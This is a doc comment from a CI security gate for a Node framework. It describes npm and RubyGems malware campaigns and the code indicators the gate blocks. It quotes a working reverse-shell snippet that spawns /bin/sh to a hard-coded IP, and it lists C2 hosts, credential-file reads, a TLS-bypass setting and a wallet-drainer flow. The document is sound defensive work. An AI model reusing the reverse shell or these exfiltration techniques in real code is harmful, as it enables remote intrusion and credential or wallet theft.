/**
 * Registry-exfiltration / TLS-bypass / credential-injection CI gate
 * (Socket GemStuffer class).
 *
 * Socket's 2026-05-13 write-up
 * (https://socket.dev/blog/gemstuffer) documents the **GemStuffer**
 * campaign, in which a malicious Ruby script — using only the standard
 * library — exfiltrated scraped data by building a `.gem` archive in
 * `/tmp`, fabricating a credential file under a `HOME` override, and
 * publishing the archive directly to `rubygems.org/api/v1/gems` via a
 * hard-coded API key. SSL certificate verification was disabled to
 * suppress cert errors during the scraping phase. Variants that didn't
 * even shell out to `gem push` built the request by hand with
 * `Net::HTTP::Post`, defeating any "no shell-out" gate by staying inside
 * a single Ruby process.
 *
 * The same technique translates verbatim to a malicious Node package
 * that uses only `node:fs`, `node:os`, and the global `fetch`:
 *
 *   1. **TLS verification bypass** to scrape internal or victim-side
 *      endpoints without cert warnings —
 *      `process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"`, or an
 *      `https.Agent({ rejectUnauthorized: false })`, or a `fetch` /
 *      `tls.connect` option of `rejectUnauthorized: false`.
 *   2. **`HOME` / npm-credential-file mutation** to inject a publish
 *      token into a fabricated home directory and then run `npm publish`
 *      / `pnpm publish` (already blocked by `verify-no-remote-exec`'s
 *      `child_process` ban) OR to leak a token from the consumer's real
 *      `~/.npmrc` by reading `os.homedir() + "/.npmrc"`.
 *   3. **Direct POST to a package-registry publish endpoint** — the
 *      "skip-the-CLI" GemStuffer variant translated to Node would
 *      construct a `fetch("https://registry.npmjs.org/-/npm/v1/...",
 *      { method: "POST", body: tarball })` (or the equivalent for
 *      RubyGems, PyPI, crates.io, Hex.pm) inside the runtime source
 *      itself. No `child_process` is needed; the entire exfil pipeline
 *      runs inside one Node process using only stdlib + global `fetch`.
 *
 * Daloy's runtime source (`src/**`) MUST NOT do any of the above. This
 * gate refuses to merge a PR that adds:
 *
 *   - `rejectUnauthorized: false` (any object-literal property
 *     assigning the literal `false` to `rejectUnauthorized`) — used by
 *     `https`, `tls`, `node-fetch`, `undici`, etc.
 *   - `NODE_TLS_REJECT_UNAUTHORIZED` as an environment-variable mutation
 *     target (`process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"`).
 *   - `process.env.HOME = ...` mutation (GemStuffer's HOME redirect).
 *   - String literals referencing the publish path of any major package
 *     registry: `registry.npmjs.org/-/npm/v1/...`, `rubygems.org/api/v1`,
 *     `upload.pypi.org`, `crates.io/api/v1/crates/new`, `hex.pm/api/...`.
 *   - Reads of `~/.npmrc`, `~/.yarnrc`, `~/.netrc`, `~/.gem/credentials`
 *     (host credential files the malicious package would slurp).
 *
 * This gate is the regression net for the GemStuffer attack class.
 * Combined with `verify-no-remote-exec` (no `child_process` / no `vm` /
 * no `eval` / no `new Function` / no remote dynamic `import`), a
 * malicious republish of `@daloyjs/core` has no in-process exfiltration
 * channel: it cannot shell out to `npm publish`, it cannot fetch an
 * internal endpoint with cert verification disabled, and it cannot POST
 * a tarball to a registry endpoint directly from runtime code.
 *
 * Exit code:
 *   0 — no forbidden primitives found in `src/**`.
 *   1 — at least one was found; offending lines printed to stderr.

 * **RATatouille / rand-user-agent extension (Aikido 2025-05-06, since 0.34.0):**
 * https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise
 *
 * The malicious `rand-user-agent@{1.0.110, 2.0.83, 2.0.84}` publishes hid a
 * Remote Access Trojan inside `dist/index.js` whose decoded payload used
 * four pieces of tradecraft that don't trip the upstream `child_process` /
 * `vm` / `eval` / `new Function` / TLS-bypass gates:
 *
 *   1. `global['r'] = require` then `const c = global.r; c('child_process')`
 *      — aliased-require to bypass static `require('child_process')`
 *      regex detection.
 *   2. `module.paths.push(path.join(os.homedir(), '.node_modules',
 *      'node_modules'))` — manual NODE_PATH injection so the malware
 *      could `require('axios')` / `require('socket.io-client')` after
 *      side-installing them into a hidden `~/.node_modules` directory.
 *   3. A leading-dot `~/.node_modules` hidden install dir — never used
 *      by legitimate Node tooling (real `node_modules` has no leading
 *      dot) and a clean IOC.
 *   4. Hard-coded raw-IPv4 `http://` / `ws://` C2 URLs (the documented
 *      RATatouille C2 was `http://85.239.62.36:3306` for socket.io and
 *      `http://85.239.62.36:27017/u/f` for file exfil).
 *
 * Daloy's runtime source MUST NOT do any of these. Combined with the
 * existing `verify-no-remote-exec` ban on `child_process` / `vm` /
 * `eval` / `new Function` / remote dynamic `import()`, a malicious
 * republish of `@daloyjs/core` has no in-process channel left to land
 * a RATatouille-shape RAT — the aliased-require trick is moot when
 * there's no `child_process` to call through it, and side-loading a
 * fetched `axios` is moot when there's no `.node_modules` path
 * injection to make it resolvable.

 *
 * **Telegram-bot SSH-backdoor extension (Socket 2025-04-18):**
 * https://socket.dev/blog/npm-malware-targets-telegram-bot-developers
 *
 * Three typosquatted npm packages (`node-telegram-utils`,
 * `node-telegram-bots-api`, `node-telegram-util`) impersonated the
 * legitimate `node-telegram-bot-api` and, on Linux only, called an
 * `addBotId()` routine from the library constructor that:
 *
 *   1. `fs.mkdirSync(path.join(os.homedir(), ".ssh"), { mode: 0o700 })`
 *      and `fs.appendFileSync(path.join(os.homedir(),
 *      ".ssh/authorized_keys"), publicKey)` — wrote two attacker SSH
 *      public keys into the consumer's `~/.ssh/authorized_keys`,
 *      granting persistent passwordless SSH login that survives
 *      uninstalling the package.
 *   2. `https.get("https://ipinfo.io/ip", ...)` — used a public
 *      IP-discovery endpoint to fingerprint the victim's external IP
 *      address as a DNS-less host-mapping step.
 *   3. `https.get("https://solana.validator.blog/v1/check?ip=" + ip +
 *      "&name=" + os.userInfo().username)` — POSTed the external IP
 *      and Unix username to a registered C2 domain disguised as a
 *      Solana validator analytics host, confirming the compromise.
 *
 * None of these primitives touch `child_process`, `vm`, `eval`,
 * `new Function`, or a remote `import()`, so the upstream
 * `verify-no-remote-exec` gate does NOT see them. They also don't
 * disable TLS or mutate HOME, so the upstream GemStuffer-class gates
 * above don't see them either. Daloy's runtime source has no
 * legitimate reason to ever touch `~/.ssh/`, `authorized_keys`,
 * `ipinfo.io/ip` (or its peers `icanhazip.com` / `ifconfig.me` /
 * `api.ipify.org` / `checkip.amazonaws.com`), or the documented
 * `solana.validator.blog` C2 host, so this gate refuses each as a
 * bare-literal IOC. Combined with `minimum-release-age=1440` and
 * `ignore-scripts=true` (which keep the typosquats from running on
 * `pnpm install`) and `verify-no-runtime-deps` (which keeps `@daloyjs/core`
 * at zero runtime deps, so a typosquat of one of our transitive deps
 * cannot exist), a malicious republish of `@daloyjs/core` itself has
 * no channel left to drop in an `addBotId()`-shape SSH-key-injection
 * backdoor.

 * **Advcash / `@naderabdi/merchant-advcash` reverse-shell extension
 * (Socket 2025-04-14,
 * https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell):**
 *
 * The malicious `@naderabdi/merchant-advcash` package posed as a
 * legitimate Advcash payment-gateway integration (with believable
 * SHA-256 hashing, request validation, currency checks, and
 * `url_success(req, res)` callback wiring) but hid a self-executing
 * reverse shell at the top of the success callback:
 *
 *   ```js
 *   (function(){
 *     var net = require("net"),
 *         cp  = require("child_process"),
 *         sh  = cp.spawn("/bin/sh", []);
 *     var client = new net.Socket();
 *     client.connect(8443, "65.109.184.223", function(){
 *       client.pipe(sh.stdin);
 *       sh.stdout.pipe(client);
 *       sh.stderr.pipe(client);
 *     });
 *     return /a/; // suppress crash
 *   })();
 *   ```
 *
 * The payload only detonates AT RUNTIME during a successful payment
 * (not at install or import), which lets it evade install-time
 * scanners and `ignore-scripts=true` cooldown gates. The
 * upstream `verify-no-remote-exec` ban on `child_process` already
 * stops the `cp.spawn("/bin/sh", ...)` half of this in `src/**`, and
 * `verify-no-registry-exfiltration`'s raw-IPv4-URL gate catches an
 * `http://65.109.184.223:8443/...` C2 URL — but the Advcash variant
 * dials TCP directly via `client.connect(8443, "65.109.184.223")`,
 * so the IOC IP appears as a **bare literal** rather than inside an
 * `http(s)://` URL. This gate adds two belt-and-braces literals:
 *
 *   1. The bare IOC IP `65.109.184.223`, mirroring the
 *      `85.239.62.36` (RATatouille) bare-literal IOC.
 *   2. The reverse-shell shell prefixes `/bin/sh`, `/bin/bash`,
 *      `/bin/zsh`, and the Windows `cmd.exe` shell — none of which
 *      have any legitimate use as a string literal inside Daloy's
 *      TypeScript/JavaScript runtime source. Even if a future
 *      `child_process` ban bypass landed (e.g. an
 *      `eval`-from-base64 trick that reconstructs `"child_process"`
 *      at runtime), a `spawn("/bin/sh", ...)`-shape reverse shell
 *      would still need the shell name as a literal somewhere — and
 *      this gate refuses that.

 * **`xlsx-to-json-lh` remote-trigger codebase-wiper campaign (Socket
 * 2025-05-30,
 * https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger):**
 *
 * The malicious `xlsx-to-json-lh` package typosquatted the legitimate
 * `xlsx-to-json-lc` Excel-to-JSON converter (one-letter substitution,
 * `lc` → `lh`) and embedded a working conversion function alongside a
 * hidden payload at `libs/support/index.js` that immediately opened a
 * persistent socket.io WebSocket to
 * `https://informer-server.herokuapp.com` on `require()`. The C2
 * channel waited for a message of shape `{ type: "remise à zéro" }`
 * (French for "reset to zero") and, on receipt, walked back from
 * `__dirname` through `node_modules` to the consumer project root and
 * called `rmDir(projectRoot)` to recursively delete the entire
 * project — source, `.git/`, `node_modules`, configs, assets — then
 * `socket.emit("message", { type: "removed-successfully" })` to
 * confirm destruction. Recovery without external backups is
 * impossible.
 *
 * The end-to-end defense for this attack class is layered:
 *
 *   - **Typosquatting**: `verify-known-dep-names` (explicit allowlist
 *     of every top-level dep in the workspace) makes
 *     `pnpm add xlsx-to-json-lh` fail in the same PR that introduces
 *     it, even after the 24h `minimum-release-age=1440` cooldown.
 *   - **Zero runtime deps**: `verify-no-runtime-deps` keeps
 *     `@daloyjs/core` at zero runtime deps so a typosquat of one of
 *     our transitive deps cannot exist.
 *   - **Install-time silence**: `ignore-scripts=true` +
 *     `verify-no-lifecycle-scripts` ensure even an installed
 *     typosquat cannot run on `pnpm install`.
 *   - **No C2 channel from core**: this gate refuses the documented
 *     `informer-server.herokuapp.com` C2 host literal AND the
 *     `remise à zéro` French trigger phrase as bare-literal IOCs.
 *     The trigger phrase is rare enough in legitimate prose that
 *     a hard-literal match in `src/**` is a high-signal indicator.
 *   - **No wiper primitive in core**: this gate also refuses every
 *     destructive filesystem-deletion API call
 *     (`rmSync`, `rmdirSync`, `unlinkSync`, `fs.rm(`, `fs.rmdir(`,
 *     `fs.unlink(`, and the `node:fs/promises` peers). A backend
 *     HTTP framework's runtime source has zero legitimate reason
 *     to delete a file or directory tree — combined with the
 *     `verify-no-remote-exec` ban on `child_process` / `vm` /
 *     `eval` / `new Function` / remote `import()`, there is no
 *     in-process channel left for a wiper to land in
 *     `@daloyjs/core`.

 * **Vietnam-Telegram-ban Fastlane typosquat campaign (Socket
 * 2025-06-03,
 * https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban):**
 *
 * Two malicious RubyGems (`fastlane-plugin-telegram-proxy`,
 * `fastlane-plugin-proxy_teleram`) cloned the legitimate
 * `fastlane-plugin-telegram` plugin near-verbatim and changed a
 * single line: the Telegram Bot API endpoint
 * `https://api.telegram.org/bot{token}/sendMessage` was replaced
 * with a hard-coded Cloudflare Worker C2 at
 * `https://rough-breeze-0c37.buidanhnam95.workers.dev/bot{token}/sendMessage`.
 * Every Telegram message, bot token, chat ID, and uploaded file
 * routed through the relay was silently captured. The lure was
 * timed to Vietnam's nationwide May 21 2025 Telegram block so
 * developers searching for proxies would adopt the typosquats.
 *
 * The attack class is RubyGems / Fastlane and lands outside Daloy's
 * ecosystem, but the **endpoint-substitution + opaque-Cloudflare-Worker-relay
 * tradecraft** translates directly to npm: a malicious republish of
 * `@daloyjs/core` could insert one hardcoded
 * `https://<random>.workers.dev/...` URL as a proxy for any API call
 * and exfiltrate request bodies through an attacker-controlled
 * Worker. Cloudflare Worker source is not publicly visible, so the
 * relay is opaque by design.
 *
 * Daloy core's runtime source never calls any third-party API, so
 * any URL-shaped `https://<sub>.workers.dev/...` literal in `src/**`
 * is presumptively a C2 relay. This gate refuses:
 *
 *   - The documented exact-host IOC
 *     `rough-breeze-0c37.buidanhnam95.workers.dev` (kept as a
 *     bare-literal IOC for grep parity with prior campaign blocks).
 *   - Any URL-shaped Cloudflare Worker host literal
 *     `https?://<at-least-one-sub>.workers.dev/...` — Daloy core
 *     legitimately mentions the bare `workers.dev` PSL suffix in
 *     `src/subdomains.ts` (a Public Suffix List entry, not a URL),
 *     so the gate is scoped to URL-shaped occurrences only and the
 *     existing PSL entry continues to pass.

 *
 * **`@crypto-exploit` BSC/Ethereum wallet-drainer campaign (Socket
 * 2025-06-02,
 * https://socket.dev/blog/malicious-npm-packages-target-bsc-and-ethereum):**
 *
 * Four malicious npm packages
 * (`pancake_uniswap_validators_utils_snipe`,
 * `pancakeswap-oracle-prediction`, `ethereum-smart-contract`,
 * `env-process` — the last typosquats the legitimate `process`
 * browser-shim) collectively pulled ~2,100 downloads. Each package
 * required `web3`, read `process.env.YOUR_ACCOUNT_ADDRESS` and
 * `process.env.YOUR_ACCOUNT_PRIVATE_KEY` from the victim's environment,
 * built a transaction transferring 80–85 % of the wallet's balance
 * to the hardcoded attacker address
 * `0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02`, signed it via
 * `web3.eth.accounts.signTransaction(...)`, and broadcast it via
 * `web3.eth.sendSignedTransaction(...)`. RPC endpoints alternated
 * between BSC (`https://bsc-dataseed1.defibit.io/`) and Ethereum
 * (`https://cloudflare-eth.com/`). None of the primitives touch
 * `child_process`, `vm`, `eval`, `new Function`, dynamic remote
 * `import()`, TLS bypass, `HOME` mutation, raw-IPv4 URLs, or a
 * postinstall hook — the entire drain runs at first `require()` of
 * the malicious package using only the `web3` SDK and stdlib.
 *
 * `@daloyjs/core` is a backend HTTP framework with zero runtime
 * dependencies (`pnpm verify:no-runtime-deps`) and never signs or
 * broadcasts blockchain transactions from `src/**`. Any of the
 * following in runtime source is a hard IOC of this attack class:
 *
 *   - The exact attacker wallet address
 *     `0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02` as a bare literal.
 *   - A web3-SDK transaction-signing primitive
 *     (`eth.accounts.signTransaction(...)`) — the in-process key-use
 *     step the drainer needs to authorize the outbound transfer.
 *   - A web3-SDK signed-transaction broadcast primitive
 *     (`eth.sendSignedTransaction(...)`) — the on-chain submission
 *     step that actually drains the wallet.
 *
 * Combined with `ignore-scripts=true` (blocks the easier postinstall
 * channel), `minimum-release-age=1440` (24 h cooldown closes the
 * first-day install window), `verify-no-runtime-deps` (zero runtime
 * deps means no `web3` can ride in transitively through us), and
 * `verify-known-dep-names` (any direct addition of `web3` or one of
 * the four flagged packages would fail the allowlist), a malicious
 * republish of `@daloyjs/core` has no in-process channel to land
 * the drainer.
